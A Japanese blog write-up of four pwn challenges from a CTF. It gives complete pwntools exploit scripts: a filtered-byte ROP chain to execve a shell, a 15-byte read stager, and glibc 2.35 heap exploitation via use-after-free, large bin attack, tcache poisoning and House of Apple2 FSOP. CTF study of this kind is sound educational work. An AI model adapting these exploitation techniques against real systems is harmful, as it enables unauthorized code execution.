+++
date = 2026-06-06
title = "THEM?CTF writeup/upsolve"
[taxonomies]
tags = ["CTF"]
+++

## これは何
最近あったTHEM?CTFのwriteup+upsolveです。なおPwnは8問ありましたが、ここでは4問のみ記述します。理由は私が弱いからです。

## warm-up
Ghidraによる解析を行った結果、read関数によるBoFが存在している。checksecの結果はcanary foundだが、Ghidraでは見えなかったため、このままROPに繋げられる。しかしcanaryは無いが、入力した値に0x2f、0x73、0x61、0x74が含まれているとreturnではなくexitしてしまう。このため、前述した4値が含まれないようなROPを作成すれば良い。なおオフセットは17*8バイトだった。下記Exploitはreadを行って`bss+0x100`に`/bin/sh\x00`を配置し、このアドレスを使って`execve(bss+0x100, 0, 0)`を実行している。
```python
def check_payload(payload):
    for i in range(len(payload)):
        if payload[i] == 0x2f:
            print(f"0x2f found in {i:x}")
            return 1
        if payload[i] == 0x73:
            print(f"0x73 found in {i:x}")
            return 1
        if payload[i] == 0x61:
            print(f"0x61 found in {i:x}")
            return 1
        if payload[i] == 0x74:
            print(f"0x74 found in {i:x}")
            return 1
    return 0


DEBUG = False
def main():

    rop = ROP(elf)
    rop.raw(b"A"*(17*8))

    # read(0, elf.bss()+0x100, 8)
    rop.raw(0x401f9f)	        # pop rdi; ret
    rop.raw(0)
    rop.raw(0x40a00e)	        # pop rsi; ret
    rop.raw(elf.bss())
    rop.raw(0x485d2b)	        # pop rdx; pop rbx; ret
    rop.raw(8)
    rop.raw(0)
    rop.raw(elf.sym["read"])

    # execve(elf.bss()+0x1000, 0, 0)
    rop.raw(0x401f9f)	        # pop rdi; ret
    rop.raw(elf.bss())
    rop.raw(0x40a00e)	        # pop rsi; ret
    rop.raw(0)
    rop.raw(0x485d2b)	        # pop rdx; pop rbx; ret
    rop.raw(0)
    rop.raw(0)
    rop.raw(0x44ffc7)	        # pop rax; ret
    rop.raw(constants.SYS_execve)
    rop.raw(0x4909ae)	        # syscall

    payload = rop.chain()

    if(DEBUG):
        print(rop.dump())
        print(hexdump(payload))
        print(len(payload))
        print(f"elf.bss() = {elf.bss():#x}")
        assert(check_payload(payload) != 1)
        assert(len(payload) <= 288)

    conn.recvlines(2)
    conn.send(payload)
    sleep(1)	                # 上のsendは通常の入力で。下の入力はROPで動かしたread用の入力。しかし連続させると上の入力に上下どちらも吸われる
    conn.send(b"/bin/sh\x00")
    conn.interactive()
```

## baby shellcode (upsolve)
Ghidraによる解析の結果、15バイトのシェルコードを受け取り、これを実行する。当然小さすぎるし書いてあったがstagerとのこと。15バイトのシェルコード実行直前のレジスタを見てみるとrdi, rsi, rdx, raxがrwxな領域へのアドレスを持っていた。このため、stagerとしては2個目のシェルコードを受け取るために、read syscallを発行するものを作成すれば良い。readは`read(fd, buf, size)`なので、rdiに0、rsiにrwxのアドレス、rdxに適当な値、raxに0を入れれば良い。
```python
def main():
    conn.recvlines(3)

    # rax = 0     = read
    # rdi = stdin = 0
    # rsi = buf   = saved_rdi
    # rdx = size  = 0x0fff
    shellcode = asm(f"""
        xor edi, edi
        xor eax, eax
        mov edx, 0x0fff
        syscall
    """)
    assert(len(shellcode) <= 15)
    shellcode.ljust(15, b"\x00")
    conn.send(shellcode)
    sleep(1)

    shellcode = (b"\x90"*15) + asm(shellcraft.sh())
    conn.send(shellcode)

    conn.interactive()
```
## heapshifter
よくあるHeap問。glibcのバージョンは2.35だった。
```
$ strings ./libc.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.13) stable release version 2.35.
```

実行してみると以下のような感じ。
```
$ ./heapshifter
the heap remembers what you shift into it.

== heapshifter ==
1) shift in   (alloc)
2) drop       (free)
3) re-shift   (edit)
4) peek       (view)
5) leave
```

ここで、Ghidra等で`2) drop (free)`時の処理を見てみる。読みづらいが、`free`後にNULLで上書きされておらず、自明なUAFが存在する。
```c
case 2:
  __printf_chk(1,"slot: ");
  fflush(stdout);
  slot = FUN_001015f0();
  if (0xf < slot) goto LAB_001014b7;
  if (*(void **)(&heap_addr_holder + slot * 8) == (void *)0x0) {
LAB_001014c3:
                  /* WARNING: Subroutine does not return */
    err_and_exit("empty slot");
  }
  free(*(void **)(&heap_addr_holder + slot * 8));
  pcVar2 = "dropped slot %ld\n";
  break;
```

なお、`1) shift in (alloc)`時には`slot`及び`size`の制限が存在している。
```
   0 <= slot <=   15
1040 <= size <= 1232
```

また、`3) re-shift (edit)`時には入力がエンコードされてから格納される。
このエンコーディングはXORによるものなので、先にXORしておくと、エンコードしたものを攻撃対象側で再度エンコードさせ、結果的に目的の値を格納させることができる。
具体的には以下のようなコードをペイロード送信前に実行しておくと良い。
```python
def encode_payload(payload):
    magic = b"\x53\x68\x1f\x74\x21\x6d\x65\x90"
    payload = bytearray(payload)
    for i in range(len(payload)):
        payload[i] = payload[i] ^ magic[i&7]
    return bytes(payload)
```

これら前提をもとに、UAFを悪用する方法を考える。UAFがあるということはfreeされたchunkのfdやbkなどを書き換え、任意アドレスをchunkとしてbinにつなげることができ、これをallocateすることで結果的にAAW/Rが可能である。ではAAR/Wが可能である場合何ができるだろうか。glibcが2.35であるため`__free_hook/__malloc_hook`の悪用はできない。正直AAR/Wがある状態のHeap問はFSOP程度しか思いつかないため、今回はHouse of Apple2を利用した。


また、House of Apple2を成功させるためには`_IO_list_all`の上書きが必要である。はじめに思いつく手法はtcache poisoningからのAAR/Wだが、今回はサイズ制限によって`1040=0x410`からのallocateしかできない。つまりunsortedやlarge binsを悪用して`_IO_list_all`を上書きする必要があった。このため、今回はLarge bin Attackを行うことで、`_IO_FILE_plus`を書き込むchunkのアドレスを`_IO_list_all`に書き込んだ。また、Large bin Attackではchunkのメタデータを含む先頭アドレスを書き込んでいるため、`_IO_FILE_plus`をchunkに書き込む際、先頭の0x10バイトはこちらでコントロールできない。詳細なHouse of Aplle2の解説は行わないが、要は偽造した`_IO_FILE_plus`のアドレスを`_IO_list_all`に保持させることで任意の処理を実行できるという攻撃である。この際、`_IO_jump_t+0x68`(`_IO_FILE_plus`が必要とする構造体の1つ)には関数のアドレス、`_IO_FILE_plus`の先頭には関数に渡す引数を設定する必要があった。しかし前述する通り、`_IO_FILE_plus`の先頭はコントロールできない(Large bin Attackによって`_IO_list_all`にはchunkの先頭があるため)。このため今回は、`_IO_jump_t+0x68`にOne Gadgetを配置することで引数を必要なくしている。

```
_IO_list_allはaddrの箇所から_IO_FILE_plusが開始していると思っている
        addr -> +---chunk---+
                | metadata  | <- " sh"を配置したい箇所
                +-----------+
                | user data | <- ユーザがコントロール可能な領域
                +-----------+
```


Exploitは以下の通りとなる。
```python
# alloc
def alloc(slot, size):
    assert(0 <= slot <= 15)
    assert(1040 <= size <= 1232)
        
    conn.sendlineafter(b"> ", b"1")
    conn.sendlineafter(b"slot: ", str(slot).encode())
    conn.sendlineafter(b"size: ", str(size).encode())

# free
def free(slot):
    conn.sendlineafter(b"> ", b"2")
    conn.sendlineafter(b"slot: ", str(slot).encode())

# edit
def edit(slot, payload):
    conn.sendlineafter(b"> ", b"3")
    conn.sendlineafter(b"slot: ", str(slot).encode())
    conn.send(payload)

# view
def view(slot):
    conn.sendlineafter(b"> ", b"4")
    conn.sendlineafter(b"slot: ", str(slot).encode())

# exit
def exit():
    conn.sendlineafter(b"> ", b"5")

def encode_payload(payload):
    magic = b"\x53\x68\x1f\x74\x21\x6d\x65\x90"
    payload = bytearray(payload)
    for i in range(len(payload)):
        payload[i] = payload[i] ^ magic[i&7]
    return bytes(payload)

DEBUG = True
def main():
    alloc(0, 0x410 + 0x10)	# victim1
    alloc(1, 0x410)	        # consolidate guard
    alloc(2, 0x410)	        # victim2
    alloc(3, 0x410)	        # consolidate guard

    # large bin attackを行い、_IO_list_allにslot2のアドレスを書き込む
    # 1. slot0をlargebinへ
    free(0)
    alloc(4, 0x430)
    # 2. slot0からlibc/heap leak
    view(0)
    data_slot0 = bytearray(conn.recv(0x420))
    libc_leak = u64(data_slot0[0x0:0x8])
    libc.address = libc_leak - (libc.sym["main_arena"]+0x450)
    # 3. slot0のbk_nextsizeを&_IO_list_all-0x20に上書き
    data_slot0[0x18:0x20] = p64(libc.sym["_IO_list_all"]-0x20)
    edit(0, encode_payload(bytes(data_slot0)))
    # 4. _IO_list_allにslot2のアドレスを書き込む
    free(2)
    alloc(5, 0x430)

    # slot2のアドレスを読み出す
    # 一度目のview(0)ではfree(2)をしていないからslot2のアドレスがbkにつながっていない
    view(0)
    address_of_slot2 = u64(bytearray(conn.recv(0x420))[0x0:0x8])

    # house of apple2 
    # _IO_FILE_plusをslot2の先頭に配置する
    address_of_IO_FILE_plus = address_of_slot2
    address_of_IO_jump_t = address_of_IO_FILE_plus+0xe0
    address_of_IO_wide_data = address_of_IO_jump_t+0xa8
    address_of_IO_lock_t = address_of_IO_wide_data+0xe8

    # 今回はone_gadgetのアドレスを書き込んでいる(引数が操作できないため)
    _IO_jump_t = flat({
        0x68: libc.address+0xebc81
    }, filler=b"\x00", length=0xa8)

    _IO_wide_data = flat({
        0xe0: address_of_IO_jump_t,
    }, filler=b"\x00", length=0xe8)

    _IO_lock_t = b"\x00" * 0x10

    # _IO_list_allにはslot2のメタデータを含む先頭アドレスが書き込まれている
    # しかし、ユーザはメタデータの0x10バイト分を操作できない
    # 本来はoffset 0x0に"sh_0x00"を書き込み、_IO_jump_tの0x68にsystem()のアドレスを書き込む必要がある
    # 今回はoffset 0x0が操作できないので、one_gadgetでどうにかした
    _IO_FILE_plus = flat({
        #0x00: 0x00687320,
        0x20-0x10: 0x0,
        0x28-0x10: 0x1,
        0x88-0x10: address_of_IO_lock_t,
        0xa0-0x10: address_of_IO_wide_data,
        0xc0-0x10: 0x0,
        0xd8-0x10: libc.sym["_IO_wfile_jumps"]
    }, filler=b"\x00", length=0xe0-0x10)

    payload = (_IO_FILE_plus + _IO_jump_t + _IO_wide_data + _IO_lock_t).ljust(0x410, b"\x00")

    if DEBUG:
        info(f"libc leak: {libc_leak:#x}")
        info(f"libc base: {libc.address:#x}")
        info(f"_IO_list_all: {libc.sym["_IO_list_all"]:#x}")
        info(f"slot2: {address_of_slot2:#x}")
        info(f"_IO_jump_t: {address_of_IO_jump_t:#x}")
        info(f"_IO_wide_data: {address_of_IO_wide_data:#x}")
        info(f"_IO_lock_t: {address_of_IO_lock_t:#x}")
        info(f"_IO_FILE_plus: {address_of_IO_FILE_plus:#x}")

    edit(2, encode_payload(payload))
    exit()
    conn.interactive()
```

## quantum clipboard
heapshipterとかなり似ているが、こちらはallocate時のサイズ制限が無い。UAFは一見なさそうだが、`5. entangle slots`を利用することでヒープのアドレスを別の`slot`にコピーしておくことができる。このためentabgleでコピーしてからどちらかをfreeし、もう片方を使って`3. edit fragment`などすればUAFが可能である。サイズ制限は無いため、tcache poisoningが可能であり、任意AAW/Rが達成できる。あとは先程と同じようにHouse of Apple2で終了。Large bin Attackがない分楽である。
```python
def alloc(slot, size, data):
    conn.sendlineafter(b"> ", b"1")
    conn.sendlineafter(b"> ", str(slot).encode())
    conn.sendlineafter(b"> ", str(size).encode())
    conn.sendafter(b"> ", data)

def view(slot):
    conn.sendlineafter(b"> ", b"2")
    conn.sendlineafter(b"> ", str(slot).encode())

# dataのサイズはalloc時に利用したもの
def edit(slot, data):
    conn.sendlineafter(b"> ", b"3")
    conn.sendlineafter(b"> ", str(slot).encode())
    conn.sendafter(b">", data)

def free(slot):
    conn.sendlineafter(b"> ", b"4")
    conn.sendlineafter(b"> ", str(slot).encode())

def entangle(src_slot, dest_slot):
    conn.sendlineafter(b"> ", b"5")
    conn.sendlineafter(b"> ", str(src_slot).encode())
    conn.sendlineafter(b"> ", str(dest_slot).encode())

def exit():
    conn.sendlineafter(b"> ", b"6")

def main():
    payload = b"A" * 0x410
    alloc(0, len(payload), payload)
    payload = b"A" * 0x20
    alloc(1, len(payload), payload)
    payload = b"A" * 0x410
    alloc(2, len(payload), payload)
    payload = b"A" * 0x20
    alloc(3, len(payload), payload)

    entangle(0, 4)
    entangle(2, 5)

    free(0)
    free(2)

    view(4)
    conn.recvuntil(b": ")
    data_slot0 = bytearray(conn.recv(0x410))
    libc.address = u64(data_slot0[0x0:0x8]) - (libc.sym["main_arena"]+96)
    addr_slot2 = u64(data_slot0[0x8:0x10])
    info(f"libc base: {libc.address:#x}")
    info(f"addr slot2: {addr_slot2:#x}")


    # binsを空にしておく
    payload = b"R"*0x410
    alloc(0, len(payload), payload)
    payload = b"S"*0x410
    alloc(2, len(payload), payload)
 
    addr_slot3 = addr_slot2 + 0x420
    addr_slot8 = addr_slot3 + 0x30 + 0x20*2
    info(f"addr slot8: {addr_slot8:#x}")

    payload = b"A" * 0x18
    alloc(6, len(payload), payload)
    payload = b"A" * 0x18
    alloc(7, len(payload), payload)
    payload = b"A" * 0x18
    alloc(8, len(payload), payload)
    payload = b"A" * 0x18
    alloc(9, len(payload), payload)

    entangle(8, 10)

    free(6)
    free(8)

    view(10)
    conn.recvuntil(b": ")
    data_slot8 = bytearray(conn.recv(0x18))
    data_slot8[0:8] = p64(safe_linking_mangle(addr_slot8+0x10, libc.sym["_IO_list_all"]))
    edit(10, bytes(data_slot8))

    # _IO_list_allに、slot2のアドレスを入れる
    info(f"_IO_list_all: {libc.sym["_IO_list_all"]:#x}")
    payload = b"A"*0x18
    alloc(11, len(payload), payload)
    payload = p64(addr_slot2+0x10).ljust(0x18, b"\x00")
    alloc(12, len(payload), payload)

    # slot2に_IO_FILE_plusを用意して発火
    addr_IO_FILE_plus = addr_slot2+0x10
    addr_IO_jump_t = addr_IO_FILE_plus+0xe0
    addr_IO_wide_data = addr_IO_jump_t+0xa8
    addr_IO_lock_t = addr_IO_wide_data+0xe8

    _IO_jump_t = flat({
        0x68: libc.sym["system"],
    }, filler=b"\x00", length=0xa8)

    _IO_wide_data = flat({
        0xe0: addr_IO_jump_t,
    }, filler=b"\x00", length=0xe8)

    _IO_lock_t = b"\x00" * 0x10

    _IO_FILE_plus = flat({
        0x00: 0x00687320,
        0x20: 0x0,
        0x28: 0x1,
        0x88: addr_IO_lock_t,
        0xa0: addr_IO_wide_data,
        0xc0: 0x0,
        0xd8: libc.sym["_IO_wfile_jumps"]
    }, filler=b"\x00", length=0xe0)

    payload = (_IO_FILE_plus + _IO_jump_t + _IO_wide_data + _IO_lock_t).ljust(0x410, b"\x00")
    edit(2, payload)

    exit()

    conn.interactive()
```
